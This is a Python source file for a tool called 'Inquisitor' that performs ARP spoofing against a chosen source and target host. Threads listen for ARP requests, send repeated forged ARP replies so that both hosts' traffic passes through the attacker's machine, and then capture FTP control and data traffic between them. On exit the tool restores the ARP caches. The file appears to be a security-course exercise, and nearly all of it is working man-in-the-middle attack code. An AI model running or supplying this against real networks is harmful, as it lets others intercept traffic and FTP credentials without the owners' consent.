from machine_obj import *
from packet_handler import *
from ainsi import *
import sys
from datetime import datetime
import threading

#! UTILS

def get_output_file_name():
    return datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".csv"

def priting_machines(inquisitor, arp_req_count):
    print(erase_lines(6), end="")
    log_info(inquisitor.attacker)
    log_info(inquisitor.source)
    log_info(inquisitor.target)
    log_info(f"ARP requests processed: {colored(str(arp_req_count), BLUE)}")
    print()

#! CLASS 

class Inquisitor:
    def __init__(self, source_ip, source_mac, target_ip, target_mac):
        self.attacker = Machine(None, None, "Attacker")
        self.source = Machine(source_mac, source_ip, "Source")
        self.target = Machine(target_mac, target_ip, "Target")

        self.interface = "enp0s3"
        self.ouput_file = get_output_file_name()

        self.threading()

    #? LAUNCHING ALLS THREADS
    def threading(self):
        thread_request = threading.Thread(target=self.arp_listener, daemon=False, name="ARP Listener")
        thread_reply = threading.Thread(target=self.arp_replier, daemon=False, name="ARP Replier")
        thread_capture = threading.Thread(target=self.ftp_listener, daemon=False, name="FTP Listener")
        
        thread_request.start()
        thread_reply.start()
        thread_capture.start()

    #! MAN IN THE MIDDLE
    #? FUNCTIONS ARE PLACED IN THE SAME ORDER OF EXECUTIONS IN THREADS
    
    #! WAITING TO GET ARP REQUEST FROM TARGET AND SOURCE
    def arp_listener(self):
        count = 0
        priting_machines(self, count)
        cap_arp = None

        try:
            cap_arp = pcapy.open_live(self.interface, 65535, True, 100)
            cap_arp.setfilter("arp")
            while True:
                header, packet = cap_arp.next()
                if header is not None and packet is not None:
                   sender_mac, sender_ip, target_mac, target_ip = process_request_packet(header, packet, self)
                
                count += 1
                    
                if sender_ip == self.source.ip_address and target_ip == self.target.ip_address:
                    self.source.poisoned = True
                elif sender_ip == self.target.ip_address and target_ip == self.source.ip_address:
                    self.target.poisoned = True
                    
                priting_machines(self, count)
                if self.source.poisoned and self.target.poisoned:
                    break
                  
        except pcapy.PcapError as e:
            log_error(f"Pcapy error during capture: {e}")
            log_error("Make sure to run the script with root privileges (sudo).")
            log_error(f"Check that the interface '{self.interface}' exists and is operational.")
        except Exception as e:
            log_error(f"An unexpected error occurred in the looking_for_arp_requests function: {e}")
        finally:
            if cap_arp:
                cap_arp.close()

    #! WILL CONTINUESLY REPLY TO SOURCE AND TARGET ATTACKER MAC ADRESS 
    def arp_replier(self):
        switch = False
        while not threading_end_event.is_set():    
            if self.source.poisoned and self.target.poisoned:
                if switch == False:
                    log_success("Both source and target have been successfully spoofed.")
                    log_info("maintaining arp connection for source and target")
                    switch = True
            if self.source.poisoned:
                send_arp_reply(self.interface, self.attacker.mac_address, self.target.ip_address, self.source.mac_address, self.source.ip_address)
            if self.target.poisoned:
                send_arp_reply(self.interface, self.attacker.mac_address, self.source.ip_address, self.target.mac_address, self.target.ip_address)
            threading_end_event.wait(1)
        if self.source.poisoned:
            send_arp_reply(self.interface, self.target.mac_address, self.target.ip_address, self.source.mac_address, self.source.ip_address)
            log_success("Restored source ARP cache.")
        if self.target.poisoned:
            send_arp_reply(self.interface, self.source.mac_address, self.source.ip_address, self.target.mac_address, self.target.ip_address)
            log_success("Restored target ARP cache.")

    #! WAITING FOR FTP TRAFFIC
    def ftp_listener(self):
        while not self.source.poisoned or not self.target.poisoned:
            threading_end_event.wait(5)
        log_warning("Starting FTP capture...")
        
        if threading_end_event.is_set():
            log_warning("FTP listener stopped before poisoning was complete due to shutdown event.")
            return

        cap_ftp = None

        try:
            cap_ftp = pcapy.open_live(self.interface, 65535, True, 100)
            cap_ftp.setfilter(f"(tcp port 21 or tcp port 20 or tcp portrange 40000-50000) and (host {self.source.ip_address} or host {self.target.ip_address})")
        
            while not threading_end_event.is_set():
                header, packet = cap_ftp.next()
                if header is not None and packet is not None:
                    process_ftp_packet(header, packet)

                #? ADD WRITTING PROCESS OF FTP PACKET

        except pcapy.PcapError as e:
            log_error(f"Pcapy error during capture: {e}")
            log_error("Make sure to run the script with root privileges (sudo).")
            log_error(f"Check that the interface '{self.interface}' exists and is operational.")
        except Exception as e:
            log_error(f"An unexpected error occurred in the looking_for_arp_requests function: {e}")
        finally:
            if cap_ftp:
                cap_ftp.close()



    